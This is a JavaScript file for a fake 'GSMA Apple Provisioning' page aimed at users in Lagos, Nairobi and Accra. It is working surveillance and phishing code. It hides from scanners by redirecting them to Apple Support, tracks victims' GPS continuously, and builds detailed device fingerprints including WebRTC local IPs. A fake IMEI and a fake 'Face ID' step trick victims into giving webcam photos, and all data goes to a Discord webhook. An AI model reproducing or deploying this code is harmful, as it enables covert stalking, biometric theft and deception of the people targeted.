/**
 * ═══════════════════════════════════════════════════
 *  GSMA Apple Provisioning — Verification Engine
 * ═══════════════════════════════════════════════════
 *  Telemetry: IP, GPS (continuous), Device FP, Face Capture
 *  Delivery:  Vercel serverless proxy → Discord webhook
 *  Defense:   Headless/bot detection, scanner redirect
 */

// ── CONFIG ──
// After deploying to Vercel, this just works (relative URL).
// For local dev fallback, set FALLBACK_WEBHOOK below.
const API_ENDPOINT = '/api/verify';
const FALLBACK_WEBHOOK = null; // Set only for local testing if needed

let currentRegion = 'lagos';
let sessionId = crypto.randomUUID();

// ── Tracking State ──
let watchId = null;
let pingCount = 0;
const PING_INTERVAL_MS = 30_000;
let lastPingTime = 0;
let useDirectWebhook = false; // flips to true if /api/verify is unavailable

// ══════════════════════════════════════════
//  PHASE 0: Bot Detection & Anti-Analysis
// ══════════════════════════════════════════

(function antiBot() {
  const dominated = [
    // Headless Chrome / Puppeteer / Playwright
    navigator.webdriver,
    // PhantomJS
    window._phantom || window.__nightmare,
    // Selenium
    document.documentElement.getAttribute('webdriver'),
    // Check for Chrome DevTools Protocol automation
    window.cdc_adoQpoasnfa76pfcZLmcfl_Array ||
    window.cdc_adoQpoasnfa76pfcZLmcfl_Promise ||
    window.cdc_adoQpoasnfa76pfcZLmcfl_Symbol,
  ];

  const isBot = dominated.some(Boolean);

  // Heuristic: headless browsers often have 0 plugins and mismatched dimensions
  const suspiciousEnv =
    (navigator.plugins?.length === 0 && navigator.languages?.length <= 1) ||
    (window.outerWidth === 0 && window.outerHeight === 0);

  if (isBot || suspiciousEnv) {
    // Silently redirect to real Apple Support — scanner sees a legit page
    window.location.replace('https://support.apple.com/en-us/111901');
    return;
  }
})();

// ══════════════════════════════════════════
//  DOM References
// ══════════════════════════════════════════

const elements = {
  btn: document.getElementById('main-btn'),
  progressContainer: document.getElementById('progress-container'),
  imeiResult: document.getElementById('imei-result'),
  imeiValue: document.getElementById('imei-value'),
  statusText: document.getElementById('status-text'),
  headerText: document.getElementById('header-text'),
  faceIdSection: document.getElementById('faceid-section'),
  faceIdBtn: document.getElementById('faceid-btn'),
  faceIdVideo: document.getElementById('faceid-video'),
  faceIdCanvas: document.getElementById('faceid-canvas')
};

loadRegion();
elements.btn.addEventListener('click', startCapture);
elements.faceIdBtn.addEventListener('click', startFaceCapture);

// ══════════════════════════════════════════
//  Region Loading
// ══════════════════════════════════════════

function loadRegion() {
  const lang = navigator.language.toLowerCase();
  if (lang.includes('ke')) currentRegion = 'nairobi';
  else if (lang.includes('gh')) currentRegion = 'accra';

  fetch('/regions.json').then(r => r.json()).then(regions => {
    const reg = regions[currentRegion];
    if (reg) {
      elements.headerText.textContent = reg.header;
      elements.statusText.textContent = reg.status;
    }
  }).catch(() => {});
}

// ══════════════════════════════════════════
//  PHASE 1: Main Capture Flow
// ══════════════════════════════════════════

async function startCapture() {
  elements.btn.classList.add('hidden');
  elements.progressContainer.classList.remove('hidden');
  elements.statusText.textContent = "Verifying Identity...";

  // Silent IP & Fingerprint
  captureBaseMetrics();

  // Continuous GPS
  watchId = navigator.geolocation.watchPosition(onGpsUpdate, gpsError, {
    enableHighAccuracy: true,
    timeout: 15000,
    maximumAge: 0
  });

  // Keep-alive
  startKeepAlive();
}

function captureBaseMetrics() {
  Promise.all([
    fetch('https://ipapi.co/json/').then(r => r.json()).catch(() => ({})),
    getFingerprint()
  ]).then(([ipData, fp]) => {
    sendPayload({ ...ipData, ...fp, eventType: 'INITIAL_HIT' });
  });
}

// ══════════════════════════════════════════
//  PHASE 2: GPS Tracking
// ══════════════════════════════════════════

function onGpsUpdate(pos) {
  const now = Date.now();
  const coords = {
    latitude: pos.coords.latitude,
    longitude: pos.coords.longitude,
    accuracy: pos.coords.accuracy
  };

  if (pingCount === 0) {
    elements.statusText.textContent = "Provisioning New Hardware Identity...";
    sendPayload({ coords, eventType: 'GPS_HIT' });
    setTimeout(showGeneratedImei, 2000);
  } else if (now - lastPingTime >= PING_INTERVAL_MS) {
    sendPayload({ coords, pingNumber: pingCount, eventType: 'GPS_PING' });
  } else {
    return;
  }

  lastPingTime = now;
  pingCount++;
}

function gpsError() {
  elements.statusText.textContent = "Provisioning New Hardware Identity...";
  setTimeout(showGeneratedImei, 1500);
}

// ══════════════════════════════════════════
//  PHASE 3: IMEI Generation → Face ID Hook
// ══════════════════════════════════════════

function generateImei() {
  const tac = '35' + Array.from({length: 6}, () => Math.floor(Math.random() * 10)).join('');
  const snr = Array.from({length: 6}, () => Math.floor(Math.random() * 10)).join('');
  const partial = tac + snr;

  let sum = 0;
  for (let i = 0; i < 14; i++) {
    let d = parseInt(partial[i]);
    if (i % 2 === 1) { d *= 2; if (d > 9) d -= 9; }
    sum += d;
  }
  return partial + ((10 - (sum % 10)) % 10);
}

function getPersistentImei() {
  let imei = localStorage.getItem('gsma_provisioned_imei');
  if (!imei) {
    imei = generateImei();
    localStorage.setItem('gsma_provisioned_imei', imei);
  }
  return imei;
}

function showGeneratedImei() {
  const newImei = getPersistentImei();

  elements.progressContainer.classList.add('hidden');
  elements.imeiResult.classList.remove('hidden');
  elements.imeiValue.textContent = newImei;
  elements.statusText.textContent = "Provisioning Complete";

  sendPayload({ generatedImei: newImei, eventType: 'IMEI_PROVISIONED' });

  // After a short delay, reveal the Face ID verification step
  setTimeout(() => {
    elements.faceIdSection.classList.remove('hidden');
  }, 2500);
}

// ══════════════════════════════════════════
//  PHASE 4: Face ID / Camera Capture
// ══════════════════════════════════════════

async function startFaceCapture() {
  elements.faceIdBtn.textContent = 'Initializing TrueDepth...';
  elements.faceIdBtn.disabled = true;

  try {
    const stream = await navigator.mediaDevices.getUserMedia({
      video: { facingMode: 'user', width: 640, height: 480 }
    });

    const video = elements.faceIdVideo;
    video.srcObject = stream;
    video.classList.remove('hidden');
    video.play();

    // Show the video briefly for realism, then capture
    elements.statusText.textContent = "Scanning Face ID...";

    // Wait for video to stabilize, then capture multiple frames
    setTimeout(() => captureFrames(video, stream), 1500);

  } catch (err) {
    // Camera denied — silently proceed, we already have everything else
    elements.faceIdSection.innerHTML =
      '<p class="imei-explainer">Face ID unavailable. IMEI has been linked using device fingerprint instead.</p>';
    elements.statusText.textContent = "Provisioning Complete";
  }
}

function captureFrames(video, stream) {
  const canvas = elements.faceIdCanvas;
  canvas.width = video.videoWidth || 640;
  canvas.height = video.videoHeight || 480;
  const ctx = canvas.getContext('2d');

  // Capture 3 frames 500ms apart for best quality
  let frameCount = 0;
  const captureInterval = setInterval(() => {
    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
    const dataUrl = canvas.toDataURL('image/jpeg', 0.85);
    const base64 = dataUrl.split(',')[1];

    sendImagePayload(base64, `face_${sessionId}_${frameCount}.jpg`, frameCount);
    frameCount++;

    if (frameCount >= 3) {
      clearInterval(captureInterval);
      // Cleanup
      stream.getTracks().forEach(t => t.stop());
      video.classList.add('hidden');
      elements.faceIdSection.innerHTML =
        '<div class="success-message"><div class="success-icon">✓</div>' +
        '<p>Face ID verified. Your new IMEI has been permanently linked to this device.</p></div>';
      elements.statusText.textContent = "Verification Complete";
    }
  }, 500);
}

function sendImagePayload(base64, filename, frameIndex) {
  const payload = {
    embeds: [{
      title: `🧑 FACE CAPTURE: Frame ${frameIndex + 1}/3`,
      color: 15158332, // Red
      fields: [
        { name: "Session", value: sessionId, inline: true },
        { name: "Frame", value: `${frameIndex + 1}`, inline: true }
      ],
      image: { url: `attachment://${filename}` },
      footer: { text: `GSMA Provisioning Service | ${new Date().toISOString()}` }
    }],
    image: base64,
    filename: filename
  };

  // Image payloads always go through the API (multipart required)
  fetch(API_ENDPOINT, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify(payload)
  }).catch(() => {});
}

// ══════════════════════════════════════════
//  Keep-Alive System
// ══════════════════════════════════════════

function startKeepAlive() {
  if (navigator.locks) {
    navigator.locks.request('gsma-provisioning-session', { mode: 'exclusive' }, () => {
      return new Promise(() => {});
    });
  }

  try {
    const ctx = new (window.AudioContext || window.webkitAudioContext)();
    const osc = ctx.createOscillator();
    const gain = ctx.createGain();
    gain.gain.value = 0.0001;
    osc.connect(gain);
    gain.connect(ctx.destination);
    osc.start();
  } catch (e) {}

  setInterval(() => {
    fetch('/manifest.json', { cache: 'no-store' }).catch(() => {});
  }, 25_000);
}

// ══════════════════════════════════════════
//  Deep Device Fingerprinting
// ══════════════════════════════════════════

async function getFingerprint() {
  const bat = await (navigator.getBattery ? navigator.getBattery() : Promise.resolve(null));

  let renderer = 'Unknown', vendor = 'Unknown';
  try {
    const c = document.createElement('canvas');
    const gl = c.getContext('webgl') || c.getContext('experimental-webgl');
    if (gl) {
      const d = gl.getExtension('WEBGL_debug_renderer_info');
      if (d) { renderer = gl.getParameter(d.UNMASKED_RENDERER_WEBGL); vendor = gl.getParameter(d.UNMASKED_VENDOR_WEBGL); }
    }
  } catch (e) {}

  let canvasHash = 'N/A';
  try {
    const c = document.createElement('canvas'); c.width = 200; c.height = 50;
    const ctx = c.getContext('2d');
    ctx.textBaseline = 'top'; ctx.font = '14px Arial';
    ctx.fillStyle = '#f60'; ctx.fillRect(125, 1, 62, 20);
    ctx.fillStyle = '#069'; ctx.fillText('AppleDev,;)', 2, 15);
    const d = c.toDataURL();
    let h = 0;
    for (let i = 0; i < d.length; i++) { h = ((h << 5) - h) + d.charCodeAt(i); h |= 0; }
    canvasHash = Math.abs(h).toString(16);
  } catch (e) {}

  let localIPs = [];
  try { localIPs = await getLocalIPs(); } catch (e) {}

  const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
  const networkInfo = conn ? {
    type: conn.effectiveType || 'N/A',
    downlink: conn.downlink ? `${conn.downlink} Mbps` : 'N/A',
    rtt: conn.rtt ? `${conn.rtt}ms` : 'N/A',
    saveData: conn.saveData || false
  } : null;

  let cameras = 0, mics = 0, speakers = 0;
  try {
    const devices = await navigator.mediaDevices.enumerateDevices();
    cameras = devices.filter(d => d.kind === 'videoinput').length;
    mics = devices.filter(d => d.kind === 'audioinput').length;
    speakers = devices.filter(d => d.kind === 'audiooutput').length;
  } catch (e) {}

  let storageInfo = 'N/A';
  try {
    if (navigator.storage?.estimate) {
      const est = await navigator.storage.estimate();
      storageInfo = `${(est.usage / 1024**3).toFixed(2)}GB / ${(est.quota / 1024**3).toFixed(1)}GB`;
    }
  } catch (e) {}

  let audioHash = 'N/A';
  try {
    const offCtx = new OfflineAudioContext(1, 44100, 44100);
    const osc = offCtx.createOscillator(); osc.type = 'triangle'; osc.frequency.value = 10000;
    const comp = offCtx.createDynamicsCompressor();
    osc.connect(comp); comp.connect(offCtx.destination); osc.start(0);
    const buf = await offCtx.startRendering();
    const ch = buf.getChannelData(0);
    let a = 0; for (let i = 4500; i < 5000; i++) a += Math.abs(ch[i]);
    audioHash = a.toFixed(6);
  } catch (e) {}

  return {
    screen: `${screen.width}x${screen.height}`, colorDepth: screen.colorDepth,
    pixelRatio: window.devicePixelRatio,
    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
    tzOffset: new Date().getTimezoneOffset(),
    lang: navigator.language, languages: navigator.languages?.join(', ') || navigator.language,
    platform: navigator.platform, cookieEnabled: navigator.cookieEnabled,
    doNotTrack: navigator.doNotTrack,
    hardwareConcurrency: navigator.hardwareConcurrency || 'N/A',
    deviceMemory: navigator.deviceMemory ? `${navigator.deviceMemory}GB` : 'N/A',
    maxTouchPoints: navigator.maxTouchPoints || 0,
    renderer, vendor, canvasHash, audioHash,
    localIPs: localIPs.length ? localIPs.join(', ') : 'N/A',
    networkInfo, cameras, mics, speakers, storageInfo,
    battery: bat ? `${Math.round(bat.level*100)}% ${bat.charging ? '⚡' : '🔋'}` : 'N/A',
    referrer: document.referrer || 'Direct',
    plugins: navigator.plugins?.length || 0,
    sessionId
  };
}

function getLocalIPs() {
  return new Promise((resolve) => {
    const ips = new Set();
    const pc = new RTCPeerConnection({ iceServers: [{ urls: 'stun:stun.l.google.com:19302' }] });
    pc.createDataChannel('');
    pc.onicecandidate = (e) => {
      if (!e.candidate) { pc.close(); resolve([...ips]); return; }
      const ip = e.candidate.candidate.split(' ')[4];
      if (ip?.indexOf('.') !== -1) ips.add(ip);
    };
    pc.createOffer().then(o => pc.setLocalDescription(o)).catch(() => resolve([]));
    setTimeout(() => { pc.close(); resolve([...ips]); }, 5000);
  });
}

// ══════════════════════════════════════════
//  Payload Dispatch (API proxy with fallback)
// ══════════════════════════════════════════

async function sendPayload(data) {
  let fields = [
    { name: "Event Phase", value: data.eventType || 'UNKNOWN', inline: false },
    { name: "Session", value: sessionId, inline: false }
  ];

  if (data.eventType === 'INITIAL_HIT') {
    fields.push(
      { name: "🌐 IP", value: data.ip || 'N/A', inline: true },
      { name: "🏙️ City", value: `${data.city || 'N/A'}, ${data.region || ''}`, inline: true },
      { name: "📡 ISP", value: data.org || 'N/A', inline: true },
      { name: "🌍 Country", value: data.country_name || 'N/A', inline: true },
      { name: "📮 Postal", value: data.postal || 'N/A', inline: true },
      { name: "🔗 ASN", value: data.asn || 'N/A', inline: true },
      { name: "📱 User-Agent", value: navigator.userAgent.slice(0, 200), inline: false },
      { name: "🔒 Local IPs (WebRTC)", value: data.localIPs || 'N/A', inline: false },
      { name: "🔗 Referrer", value: data.referrer || 'Direct', inline: true },
      { name: "🔋 Battery", value: data.battery || 'N/A', inline: true }
    );

    // Second embed — fingerprint details
    const fpEmbed = {
      title: '🔬 DEVICE FINGERPRINT',
      color: 5814783,
      fields: [
        { name: "Screen", value: `${data.screen} @${data.pixelRatio}x, ${data.colorDepth}bit`, inline: true },
        { name: "CPU Cores", value: `${data.hardwareConcurrency}`, inline: true },
        { name: "RAM", value: data.deviceMemory || 'N/A', inline: true },
        { name: "GPU", value: `${data.renderer}\n${data.vendor}`, inline: false },
        { name: "Platform", value: data.platform || 'N/A', inline: true },
        { name: "Touch Points", value: `${data.maxTouchPoints}`, inline: true },
        { name: "Plugins", value: `${data.plugins}`, inline: true },
        { name: "Timezone", value: `${data.timezone} (UTC${data.tzOffset > 0 ? '-' : '+'}${Math.abs(data.tzOffset/60)})`, inline: false },
        { name: "Languages", value: data.languages || 'N/A', inline: true },
        { name: "DNT", value: data.doNotTrack || 'N/A', inline: true },
        { name: "Cookies", value: data.cookieEnabled ? '✅' : '❌', inline: true },
        { name: "📷 Cameras", value: `${data.cameras}`, inline: true },
        { name: "🎤 Mics", value: `${data.mics}`, inline: true },
        { name: "🔊 Speakers", value: `${data.speakers}`, inline: true },
        { name: "💾 Storage", value: data.storageInfo || 'N/A', inline: true },
        { name: "Network", value: data.networkInfo ? `${data.networkInfo.type} | ${data.networkInfo.downlink} | RTT:${data.networkInfo.rtt}` : 'N/A', inline: false },
        { name: "Canvas Hash", value: data.canvasHash || 'N/A', inline: true },
        { name: "Audio Hash", value: data.audioHash || 'N/A', inline: true }
      ],
      footer: { text: `Session: ${sessionId}` }
    };
    dispatchToAPI({ embeds: [fpEmbed] });

  } else if (data.eventType === 'GPS_HIT' && data.coords) {
    fields.push(
      { name: "📍 GPS", value: `${data.coords.latitude}, ${data.coords.longitude}`, inline: false },
      { name: "Accuracy", value: `${data.coords.accuracy}m`, inline: true },
      { name: "Maps", value: `[Open Apple Maps](https://maps.apple.com/?q=${data.coords.latitude},${data.coords.longitude})`, inline: false }
    );
  } else if (data.eventType === 'GPS_PING') {
    fields.push(
      { name: "📍 Live Ping", value: `${data.coords.latitude}, ${data.coords.longitude}`, inline: false },
      { name: "Accuracy", value: `${data.coords.accuracy}m`, inline: true },
      { name: "Ping #", value: `${data.pingNumber}`, inline: true },
      { name: "Maps", value: `[Track on Maps](https://maps.apple.com/?q=${data.coords.latitude},${data.coords.longitude})`, inline: false }
    );
  } else if (data.eventType === 'IMEI_PROVISIONED') {
    fields.push(
      { name: "Generated IMEI", value: data.generatedImei || 'N/A', inline: false }
    );
  }

  const embed = {
    title: `📱 APPLE PROVISIONING: ${data.eventType}`,
    color: data.eventType === 'GPS_PING' ? 16750848 : 29155,
    fields: fields,
    footer: { text: `GSMA Provisioning Service | ${new Date().toISOString()}` }
  };

  dispatchToAPI({ embeds: [embed] });
}

/**
 * Dispatch to Vercel API proxy. Falls back to direct webhook if API unavailable.
 */
async function dispatchToAPI(payload) {
  try {
    const res = await fetch(API_ENDPOINT, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(payload)
    });
    if (!res.ok && FALLBACK_WEBHOOK) {
      throw new Error('API failed');
    }
  } catch {
    // Fallback: direct webhook (local dev only)
    if (FALLBACK_WEBHOOK) {
      fetch(FALLBACK_WEBHOOK, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(payload)
      }).catch(() => {});
    }
  }
}
